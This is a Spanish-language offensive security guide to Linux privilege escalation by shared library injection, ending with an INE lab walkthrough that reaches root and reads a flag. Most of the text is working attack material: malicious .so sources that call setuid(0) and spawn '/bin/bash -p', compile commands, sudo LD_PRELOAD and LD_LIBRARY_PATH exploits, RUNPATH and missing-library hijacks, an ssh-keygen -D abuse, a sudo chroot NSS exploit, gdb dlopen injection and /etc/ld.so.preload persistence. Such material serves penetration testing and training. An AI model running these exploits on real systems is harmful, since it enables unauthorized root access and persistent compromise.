
# Shared Library Injection

La inyección de bibliotecas compartidas es una técnica de escalada de privilegios que aprovecha la forma en que Linux carga las bibliotecas dinámicas (.so). Si un programa privilegiado (SUID o ejecutado con sudo) carga bibliotecas desde ubicaciones controlables por el usuario o permite la inyección mediante variables de entorno, podemos hacer que ejecute código malicioso con sus privilegios elevados.

***

## <mark style="color:purple;">Fundamentos del enlazado dinámico en Linux</mark>

Cuando se ejecuta un programa, el **enlazador dinámico** (`ld-linux.so`) busca y carga las bibliotecas compartidas necesarias siguiendo este orden:

1. **Variables de entorno** (`LD_PRELOAD`, `LD_LIBRARY_PATH`) - si están permitidas.
2. **Rutas RPATH** incrustadas en el binario (obsoleto, pero aún se encuentra).
3. **Rutas RUNPATH** incrustadas en el binario.
4. **Caché del sistema** (`/etc/ld.so.cache`).
5. **Directorios predeterminados** (`/lib`, `/usr/lib`).

Si podemos hacer que un programa privilegiado cargue una biblioteca maliciosa en lugar de la legítima, nuestro código se ejecutará con sus privilegios.

***

## <mark style="color:purple;">Inyección mediante</mark> <mark style="color:purple;"></mark><mark style="color:purple;">`LD_PRELOAD`</mark> <mark style="color:purple;"></mark><mark style="color:purple;">con sudo</mark>

#### **Detección**

`LD_PRELOAD` es una variable de entorno que fuerza la carga de una biblioteca específica **antes** que cualquier otra, permitiendo interceptar funciones. Verifica si sudo la conserva:

```bash
sudo -l
```

Busca una línea similar a:

```bash
env_keep+=LD_PRELOAD
```

Si aparece, puedes inyectar código en cualquier comando que ejecutes con `sudo`.

#### **Código malicioso**

Crea un archivo, por ejemplo `privesc.c`:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");      // Limpia la variable para evitar bucles
    setgid(0);
    setuid(0);
    system("/bin/bash -p");      // Shell con privilegios
}
```

#### **Compilación**

```bash
gcc -fPIC -shared -o privesc.so privesc.c -nostartfiles
```

#### **Explotación**

Ejecuta cualquier comando permitido por sudo junto con `LD_PRELOAD`:

```bash
sudo LD_PRELOAD=./privesc.so <comando_permitido>
```

Por ejemplo, si puedes ejecutar `find`:

```bash
sudo LD_PRELOAD=./privesc.so /usr/bin/find
```

Al ejecutarse, la biblioteca maliciosa se carga primero, su función `_init()` se ejecuta y otorga una shell con privilegios de `root`.

***

## <mark style="color:purple;">Inyección mediante</mark> <mark style="color:purple;"></mark><mark style="color:purple;">`LD_LIBRARY_PATH`</mark>

#### **Detección**

Verifica si la variable `LD_LIBRARY_PATH` se conserva al usar sudo:

```
sudo -l
```

Busca:

```
env_keep+=LD_LIBRARY_PATH
```

#### **Identificación de la biblioteca a suplantar**

Determina las bibliotecas que utiliza el comando que puedes ejecutar con sudo:

```
ldd /usr/bin/find
```

La salida mostrará algo como:

```
libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

#### **Código malicioso**

Crea una biblioteca que suplante, por ejemplo, `libselinux.so.1`. Usa el atributo `constructor` para que el código se ejecute automáticamente al cargar la biblioteca:

```c
#include <stdio.h>
#include <stdlib.h>

static void exploit() __attribute__((constructor));

void exploit() {
    setuid(0);
    system("/bin/bash -p");
}
```

#### **Compilación**

```bash
gcc -shared -fPIC -o libselinux.so.1 exploit.c
```

#### **Explotación**

```bash
sudo LD_LIBRARY_PATH=. /usr/bin/find
```

El programa buscará `libselinux.so.1` en el directorio actual (`.`) antes que en las rutas del sistema, cargando nuestra biblioteca maliciosa.

***

## <mark style="color:purple;">Explotación de</mark> <mark style="color:purple;"></mark><mark style="color:purple;">`RUNPATH`</mark> <mark style="color:purple;"></mark><mark style="color:purple;">o</mark> <mark style="color:purple;"></mark><mark style="color:purple;">`RPATH`</mark>

#### **Detección**

Examina si el binario tiene rutas de bibliotecas personalizadas:

```bash
readelf -d /usr/bin/binary | grep -E 'RPATH|RUNPATH'
```

Si aparece algo como:

```bash
0x000000000000001d (RUNPATH) Library runpath: [/development]
```

Y tienes permisos de escritura en esa ruta, puedes colocar allí una biblioteca maliciosa.

#### **Identificación de la biblioteca a suplantar**

```bash
ldd /usr/bin/binary
```

Elige una biblioteca que el binario intente cargar desde una ruta donde puedas escribir.

#### **Explotación**

Coloca la biblioteca maliciosa (compilada con el código de la sección anterior) en el directorio especificado por `RUNPATH` y ejecuta el binario.

***

## <mark style="color:purple;">Biblioteca faltante (Missing Library)</mark>

#### **Detección**

Usa `strace` para rastrear las bibliotecas que el binario intenta cargar:

```bash
strace /usr/bin/suid_binary 2>&1 | grep -iE 'open|access|no such file'
```

Busca líneas como:

```bash
open("/home/user/lib/missing.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```

Si la ruta incluye un directorio donde puedes escribir, puedes crear la biblioteca faltante.

#### **Explotación**

Crea la biblioteca en la ruta esperada con el código malicioso (usando constructor o `_init()`) y ejecuta el binario.

***

## <mark style="color:purple;">Binarios SUID que cargan bibliotecas</mark>

#### **Detección de binarios SUID**

```bash
find / -perm -4000 -type f 2>/dev/null
```

#### **Verificación de bibliotecas cargadas por SUID**

```bash
ldd /usr/bin/suid_binary | grep "not found"
```

Si alguna biblioteca no se encuentra y la ruta incluye un directorio escribible, es un excelente candidato.

#### **Ejemplo real: ssh-keygen con SUID**

El binario `ssh-keygen` puede cargar bibliotecas PKCS#11 mediante la opción `-D`. Si tiene el bit SUID activado, podemos explotarlo:

```bash
# Compilar biblioteca maliciosa
gcc -fPIC -shared -o lib.so lib.c

# Ejecutar ssh-keygen con SUID
./ssh-keygen -D ./lib.so
```

Esto cargará la biblioteca y, si `ssh-keygen` es SUID root, obtendremos una shell.

#### **Caso avanzado: `sudo -R` y módulos NSS**

Algunas versiones de `sudo` permiten cargar bibliotecas NSS desde un chroot controlado por el atacante (CVE-2025-32463):

```bash
# Preparar un chroot falso con nsswitch.conf malicioso
mkdir -p fake_root/etc
echo "passwd: /libnss_malicious.so.2" > fake_root/etc/nsswitch.conf

# Ejecutar sudo con chroot
sudo -R fake_root /bin/true
```

El cargador dinámico carga `libnss_malicious.so.2` con privilegios elevados.

***

## <mark style="color:purple;">Inyección en procesos en ejecución</mark>

#### **Uso de `gdb` para inyectar bibliotecas**

Si puedes depurar un proceso privilegiado:

```bash
gdb -p <PID>
(gdb) call (void) dlopen("/path/to/malicious.so", 1)
```

#### **Herramienta `injectso64`**

Herramienta especializada para inyectar bibliotecas en procesos en ejecución (requiere ciertos privilegios).

{% embed url="<https://github.com/ice799/injectso64>" %}

***

## <mark style="color:purple;">`ld.so.preload`</mark> <mark style="color:purple;"></mark><mark style="color:purple;">(Persistencia a nivel de sistema)</mark>

Si tienes privilegios de escritura en `/etc/ld.so.preload`, puedes hacer que **todas** las aplicaciones carguen tu biblioteca:

```bash
echo "/path/to/malicious.so" > /etc/ld.so.preload
```

Esto afecta a todo el sistema y puede usarse para mantener persistencia o interceptar llamadas a funciones en cualquier programa.

***

## <mark style="color:purple;">Automatización de la enumeración</mark>

**LinPEAS**

LinPEAS detecta automáticamente binarios SUID y verifica bibliotecas faltantes o rutas escribibles:

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

#### **Script manual de enumeración**

```bash
#!/bin/bash
# Buscar binarios SUID
find / -perm -4000 -type f 2>/dev/null | while read binary; do
    echo "Analizando $binary"
    ldd "$binary" 2>/dev/null | grep "not found"
    readelf -d "$binary" 2>/dev/null | grep -E 'RPATH|RUNPATH'
done
```

***

### Compilación de bibliotecas maliciosas

<table data-header-hidden><thead><tr><th width="205"></th><th></th><th></th></tr></thead><tbody><tr><td>Tipo de activación</td><td>Código de ejemplo</td><td>Compilación</td></tr><tr><td><code>_init()</code> (antiguo)</td><td><code>void _init() { setuid(0); system("/bin/bash"); }</code></td><td><code>gcc -fPIC -shared -o lib.so lib.c -nostartfiles</code></td></tr><tr><td>Constructor (moderno)</td><td><code>__attribute__((constructor)) void exploit() { setuid(0); system("/bin/bash -p"); }</code></td><td><code>gcc -shared -fPIC -o lib.so lib.c</code></td></tr><tr><td>Función específica</td><td><code>int strcmp(const char *s1, const char *s2) { return 0; }</code></td><td><code>gcc -shared -fPIC -o lib.so lib.c -Wl,-init,exploit</code></td></tr></tbody></table>

***

## <mark style="color:purple;">Cheatsheet</mark>

| Acción                                              | Comando                                                              |
| --------------------------------------------------- | -------------------------------------------------------------------- |
| Verificar variables de entorno conservadas por sudo | `sudo -l`                                                            |
| Listar binarios SUID                                | `find / -perm -4000 -type f 2>/dev/null`                             |
| Ver bibliotecas de un binario                       | `ldd /ruta/binario`                                                  |
| Buscar bibliotecas faltantes                        | `ldd /ruta/binario 2>&1 \| grep "not found"`                         |
| Buscar RPATH/RUNPATH                                | `readelf -d /ruta/binario \| grep -E 'RPATH\|RUNPATH'`               |
| Rastrear carga de bibliotecas                       | `strace /ruta/binario 2>&1 \| grep -iE 'open\|access\|no such file'` |
| Compilar biblioteca con constructor                 | `gcc -shared -fPIC -o evil.so evil.c`                                |
| Compilar biblioteca con `_init()`                   | `gcc -fPIC -shared -o evil.so evil.c -nostartfiles`                  |
| Inyectar con LD\_PRELOAD (sudo)                     | `sudo LD_PRELOAD=./evil.so <comando>`                                |
| Inyectar con LD\_LIBRARY\_PATH (sudo)               | `sudo LD_LIBRARY_PATH=. <comando>`                                   |
| Ejecutar LinPEAS                                    | `./linpeas.sh`                                                       |

***

## <mark style="color:purple;">Lab:</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**Load Order Matters**</mark>

¿Has conseguido acceder a una cuenta de usuario normal en un servidor Linux? ¿Has intentado obtener privilegios de root pero nada funciona? ¡Recuerda que el orden en que se cargan los programas, scripts y bibliotecas determina qué se ejecuta!

La máquina objetivo es accesible en `http://target.ine.local:8000/`

**¡Tu misión es obtener acceso de superusuario al sistema y recuperar la flag!**

Accedemos a

```bash
http://target.ine.local:8000/
```

### Comprobar privilegios

Vemos que podemos ejecutar apache2 sin contraseña:

```bash
student@target:~$ sudo -l
Matching Defaults entries for student on target:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User student may run the following commands on target:
    (root) NOPASSWD: /usr/sbin/apache2
```

Y además tenemos la variable de entorno LD\_PRELOAD:

```bash
env_keep+=LD_PRELOAD
```

### **Código malicioso**

Creamos un archivo llamado `privesc.c`:

```bash
student@target:~$ vim privesc.c
```

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");      // Limpia la variable para evitar bucles
    setgid(0);
    setuid(0);
    system("/bin/bash -p");      // Shell con privilegios
}
```

### **Compilación**

```bash
gcc -fPIC -shared -o privesc.so privesc.c -nostartfiles
```

### **Explotación**

Ejecutamos el comando `apache2` permitido por sudo:

```bash
student@target:~$ sudo LD_PRELOAD=./privesc.so /usr/sbin/apache2
root@target:~# whoami
root
```

### Acceso a la flag

```bash
root@target:~# cd /root
root@target:/root# ls
flag
root@target:/root# cat flag
368b219937989a57d0c1191a********
```
